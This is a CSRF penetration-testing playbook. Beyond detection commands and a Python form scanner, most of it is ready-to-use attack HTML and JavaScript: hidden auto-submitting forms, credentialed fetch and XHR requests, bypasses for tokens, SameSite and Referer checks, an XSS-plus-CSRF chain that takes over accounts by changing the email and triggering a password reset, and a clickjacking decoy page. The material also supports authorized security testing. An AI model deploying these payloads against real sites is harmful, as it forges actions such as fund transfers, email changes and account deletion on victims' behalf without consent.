# Cross-Site Request Forgery (CSRF) Playbook

## Indicators

Signs this vulnerability may be present:
- Forms without anti-CSRF tokens
- State-changing operations use GET requests instead of POST
- CSRF tokens present but not validated server-side
- Tokens are static or predictable (not per-session/per-request)
- SameSite cookie attribute missing or set to None
- CORS misconfiguration allowing any origin
- Token validation can be bypassed by omitting the token entirely
- Token tied to session is reusable across different sessions

## Tools

### Manual Detection

```bash
# Check if form has CSRF token
curl -s "http://target.com/account/settings" | grep -i "csrf\|token\|_token"

# Check cookie attributes
curl -I "http://target.com/" | grep -i "set-cookie"

# Test state-changing GET request
curl "http://target.com/api/transfer?to=attacker&amount=1000"

# Check if token validation can be bypassed by removing token
curl -X POST "http://target.com/api/change-email" \
     -H "Cookie: session=victim_session" \
     -d "email=attacker@evil.com"

# Test token from different session
curl -X POST "http://target.com/api/change-email" \
     -H "Cookie: session=victim_session" \
     -d "email=attacker@evil.com&csrf_token=token_from_attacker_session"

# Check CORS configuration
curl -H "Origin: https://evil.com" -I "http://target.com/api/sensitive"
```

### Burp Suite Testing

```
1. Capture request with CSRF token
2. Send to Repeater
3. Test scenarios:
   - Remove token entirely
   - Use empty token value
   - Use token from different session
   - Change HTTP method (POST to GET)
   - Change Content-Type
   - Use shorter/malformed token
4. Generate CSRF PoC: Right-click > Engagement Tools > Generate CSRF PoC
```

### Python CSRF Detection Script

```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup

def check_csrf_protection(url):
    session = requests.Session()
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')

    forms = soup.find_all('form')
    for i, form in enumerate(forms):
        action = form.get('action', url)
        method = form.get('method', 'GET').upper()

        # Check for CSRF token fields
        csrf_fields = form.find_all('input', {'name': lambda x: x and any(
            t in x.lower() for t in ['csrf', 'token', '_token', 'authenticity']
        )})

        hidden_fields = form.find_all('input', {'type': 'hidden'})

        print(f"\n[Form {i+1}] Action: {action}, Method: {method}")
        print(f"  CSRF token fields: {len(csrf_fields)}")
        print(f"  Hidden fields: {len(hidden_fields)}")

        if method == 'POST' and len(csrf_fields) == 0:
            print(f"  [!] WARNING: POST form without CSRF token!")

        for field in csrf_fields:
            print(f"  Token field: {field.get('name')} = {field.get('value', '')[:20]}...")

if __name__ == "__main__":
    check_csrf_protection("http://target.com/account/settings")
```

## Techniques

### 1. Form-Based CSRF

Classic form submission attack.

```html
<!-- Basic auto-submit form -->
<html>
<body>
<form id="csrf-form" action="http://target.com/api/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>
    document.getElementById('csrf-form').submit();
</script>
</body>
</html>

<!-- Multiple hidden fields -->
<html>
<body>
<form id="csrf-form" action="http://target.com/api/transfer" method="POST">
    <input type="hidden" name="to_account" value="attacker_account" />
    <input type="hidden" name="amount" value="10000" />
    <input type="hidden" name="currency" value="USD" />
</form>
<script>
    document.getElementById('csrf-form').submit();
</script>
</body>
</html>

<!-- Form in invisible iframe -->
<iframe style="display:none" name="csrf-frame"></iframe>
<form id="csrf-form" action="http://target.com/api/action" method="POST" target="csrf-frame">
    <input type="hidden" name="param" value="malicious" />
</form>
<script>
    document.getElementById('csrf-form').submit();
</script>

<!-- Delayed submission -->
<form id="csrf-form" action="http://target.com/api/action" method="POST">
    <input type="hidden" name="param" value="value" />
</form>
<script>
    setTimeout(function() {
        document.getElementById('csrf-form').submit();
    }, 2000);
</script>
```

### 2. JSON-Based CSRF

Attack APIs expecting JSON payloads.

```html
<!-- JSON via form with enctype -->
<html>
<body>
<form id="csrf-form" action="http://target.com/api/update" method="POST" enctype="text/plain">
    <input type="hidden" name='{"email":"attacker@evil.com","ignore":"' value='"}' />
</form>
<script>
    document.getElementById('csrf-form').submit();
</script>
</body>
</html>

<!-- JSON via XHR (requires permissive CORS) -->
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://target.com/api/update", true);
xhr.setRequestHeader("Content-Type", "application/json");
xhr.withCredentials = true;
xhr.send(JSON.stringify({
    "email": "attacker@evil.com"
}));
</script>

<!-- JSON via fetch (requires permissive CORS) -->
<script>
fetch('http://target.com/api/update', {
    method: 'POST',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        email: 'attacker@evil.com'
    })
});
</script>

<!-- Abuse Content-Type flexibility -->
<!-- Some servers accept JSON even with different Content-Type -->
<form id="csrf-form" action="http://target.com/api/update" method="POST">
    <input type="hidden" name='{"email":"attacker@evil.com"}' value='' />
</form>
<script>
    document.getElementById('csrf-form').submit();
</script>
```

### 3. File Upload CSRF

Force file upload operations.

```html
<!-- File upload via form -->
<html>
<body>
<form id="csrf-form" action="http://target.com/api/upload" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="description" value="malicious file" />
    <input type="file" name="file" />
</form>
<script>
    // Note: Cannot set file content via JavaScript due to security restrictions
    // This requires user interaction or social engineering
    document.getElementById('csrf-form').submit();
</script>
</body>
</html>

<!-- Profile picture change (URL-based) -->
<form id="csrf-form" action="http://target.com/api/avatar" method="POST">
    <input type="hidden" name="avatar_url" value="http://attacker.com/malicious.jpg" />
</form>
<script>
    document.getElementById('csrf-form').submit();
</script>
```

### 4. GET-Based CSRF

Exploit state-changing GET requests.

```html
<!-- Image tag -->
<img src="http://target.com/api/delete?id=123" style="display:none" />

<!-- Multiple actions -->
<img src="http://target.com/api/follow?user=attacker" />
<img src="http://target.com/api/like?post=attacker_post" />

<!-- Link with social engineering -->
<a href="http://target.com/api/transfer?to=attacker&amount=1000">
    Click here to claim your prize!
</a>

<!-- Iframe -->
<iframe src="http://target.com/api/action?param=value" style="display:none"></iframe>

<!-- CSS-based (background image) -->
<style>
body {
    background: url('http://target.com/api/action?param=value');
}
</style>

<!-- Script tag -->
<script src="http://target.com/api/action?param=value&callback=x"></script>
```

## Bypass Techniques

### Token Validation Bypass

```html
<!-- Remove token entirely -->
<form action="http://target.com/api/action" method="POST">
    <input type="hidden" name="param" value="value" />
    <!-- No CSRF token -->
</form>

<!-- Empty token value -->
<form action="http://target.com/api/action" method="POST">
    <input type="hidden" name="csrf_token" value="" />
    <input type="hidden" name="param" value="value" />
</form>

<!-- Use token from different session -->
<!-- Get a valid token from attacker's session and use it -->
<form action="http://target.com/api/action" method="POST">
    <input type="hidden" name="csrf_token" value="attacker_valid_token" />
    <input type="hidden" name="param" value="value" />
</form>

<!-- Change token parameter name -->
<form action="http://target.com/api/action" method="POST">
    <input type="hidden" name="CSRF_TOKEN" value="anything" />
    <input type="hidden" name="param" value="value" />
</form>

<!-- Duplicate parameter -->
<form action="http://target.com/api/action" method="POST">
    <input type="hidden" name="csrf_token" value="invalid" />
    <input type="hidden" name="csrf_token" value="" />
    <input type="hidden" name="param" value="value" />
</form>
```

### Method Override

```html
<!-- POST to GET conversion -->
<img src="http://target.com/api/action?param=value" />

<!-- Method override headers -->
<form action="http://target.com/api/action?_method=POST" method="GET">
    <input type="hidden" name="param" value="value" />
</form>

<!-- X-HTTP-Method-Override -->
<script>
fetch('http://target.com/api/action', {
    method: 'GET',
    credentials: 'include',
    headers: {
        'X-HTTP-Method-Override': 'POST'
    }
});
</script>
```

### Content-Type Bypass

```html
<!-- Change Content-Type to bypass validation -->
<form action="http://target.com/api/action" method="POST" enctype="text/plain">
    <input type="hidden" name="param" value="value" />
</form>

<!-- multipart/form-data instead of application/json -->
<form action="http://target.com/api/action" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="param" value="value" />
</form>

<!-- application/x-www-form-urlencoded bypass -->
<!-- Some APIs expecting JSON also accept form data -->
<form action="http://target.com/api/action" method="POST">
    <input type="hidden" name="param" value="value" />
</form>
```

### SameSite Cookie Bypass

```html
<!-- Navigate from top-level (for Lax cookies) -->
<a href="http://target.com/api/action?param=value" id="link">Click me</a>
<script>
    // Simulate top-level navigation
    window.location = 'http://target.com/api/action?param=value';
</script>

<!-- Using <link rel="prerender"> -->
<link rel="prerender" href="http://target.com/api/action?param=value" />

<!-- Via window.open (may bypass Lax) -->
<script>
    window.open('http://target.com/api/action?param=value');
</script>

<!-- POST via top-level navigation (doesn't bypass Lax but useful for Strict) -->
<form action="http://target.com/api/action" method="GET">
    <input type="hidden" name="param" value="value" />
    <input type="submit" value="Click for prize" />
</form>
```

### Referer Header Bypass

```html
<!-- Remove Referer header -->
<meta name="referrer" content="no-referrer">
<form action="http://target.com/api/action" method="POST">
    <input type="hidden" name="param" value="value" />
</form>

<!-- Use data: URI to remove Referer -->
<iframe src="data:text/html,<form id='f' action='http://target.com/api/action' method='POST'><input name='param' value='value'/></form><script>document.getElementById('f').submit()</script>"></iframe>

<!-- Referer validation bypass with subdomain -->
<!-- If validation checks for target.com in Referer -->
<!-- Host exploit on target.com.attacker.com -->
<form action="http://target.com/api/action" method="POST">
    <input type="hidden" name="param" value="value" />
</form>

<!-- Include target domain in query string -->
<!-- Host on https://attacker.com/?target.com -->
<form action="http://target.com/api/action" method="POST">
    <input type="hidden" name="param" value="value" />
</form>
```

### Token Leakage Exploitation

```html
<!-- If CSRF token is leaked via Referer -->
<!-- Find pages that include external resources -->
<!-- Token in URL: http://target.com/page?csrf_token=xxx -->
<!-- External image leaks Referer with token -->

<!-- Check response for token in HTML/JSON -->
<script>
fetch('http://target.com/api/profile', {
    credentials: 'include'
}).then(r => r.json()).then(data => {
    // Token might be in response
    console.log(data.csrf_token);
});
</script>
```

## Combining CSRF with XSS

When you have XSS, CSRF protections become irrelevant.

```html
<!-- XSS payload to perform CSRF -->
<script>
// Extract CSRF token from page
var token = document.querySelector('input[name="csrf_token"]').value;

// Perform authenticated action
var xhr = new XMLHttpRequest();
xhr.open('POST', '/api/change-password', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('new_password=hacked&csrf_token=' + token);
</script>

<!-- Full account takeover via XSS+CSRF -->
<script>
// Get CSRF token
fetch('/api/get-token', {credentials: 'include'})
    .then(r => r.json())
    .then(data => {
        // Change email
        return fetch('/api/change-email', {
            method: 'POST',
            credentials: 'include',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                email: 'attacker@evil.com',
                csrf_token: data.token
            })
        });
    })
    .then(() => {
        // Trigger password reset
        return fetch('/api/forgot-password', {
            method: 'POST',
            body: 'email=attacker@evil.com'
        });
    });
</script>
```

## PoC Templates

### Auto-Submit Form Template

```html
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <h1>Please wait...</h1>
    <form id="csrf-form" action="http://target.com/api/action" method="POST">
        <input type="hidden" name="param1" value="value1" />
        <input type="hidden" name="param2" value="value2" />
    </form>
    <script>
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>
```

### XHR-Based Template

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <script>
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http://target.com/api/action", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.withCredentials = true;
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) {
                console.log("Response:", xhr.responseText);
                alert("Action completed! Status: " + xhr.status);
            }
        };
        xhr.send("param1=value1&param2=value2");
    </script>
</body>
</html>
```

### Fetch API Template

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <script>
        fetch('http://target.com/api/action', {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: 'param1=value1&param2=value2'
        })
        .then(response => response.text())
        .then(data => {
            console.log('Success:', data);
            alert('CSRF attack successful!');
        })
        .catch(error => {
            console.error('Error:', error);
        });
    </script>
</body>
</html>
```

### Multi-Step CSRF Template

```html
<!DOCTYPE html>
<html>
<head>
    <title>Multi-Step CSRF</title>
</head>
<body>
    <iframe id="frame1" name="frame1" style="display:none"></iframe>
    <iframe id="frame2" name="frame2" style="display:none"></iframe>

    <!-- Step 1: Initial action -->
    <form id="form1" action="http://target.com/api/step1" method="POST" target="frame1">
        <input type="hidden" name="action" value="initiate" />
    </form>

    <!-- Step 2: Confirmation -->
    <form id="form2" action="http://target.com/api/step2" method="POST" target="frame2">
        <input type="hidden" name="action" value="confirm" />
    </form>

    <script>
        document.getElementById('form1').submit();
        setTimeout(function() {
            document.getElementById('form2').submit();
        }, 2000);
    </script>
</body>
</html>
```

### Clickjacking + CSRF Combo

```html
<!DOCTYPE html>
<html>
<head>
    <title>Win a Prize!</title>
    <style>
        .container { position: relative; width: 500px; height: 300px; }
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 500px;
            height: 300px;
            opacity: 0.0001;
            z-index: 2;
        }
        .decoy {
            position: absolute;
            top: 100px;
            left: 100px;
            z-index: 1;
        }
    </style>
</head>
<body>
    <h1>Congratulations! You've won!</h1>
    <div class="container">
        <button class="decoy">Click here to claim your prize!</button>
        <iframe src="http://target.com/api/delete-account"></iframe>
    </div>
</body>
</html>
```

## Success Indicators

- State-changing action completes without user's explicit consent
- Server processes request and returns success response
- Action is reflected in victim's account (email changed, password reset, etc.)
- No CSRF token validation error returned
- Cookie is sent with cross-origin request
- Browser does not block the request due to CORS/SameSite
- Action logged in application's activity log
- Victim receives notification of action they didn't perform
- Database state modified as a result of forged request
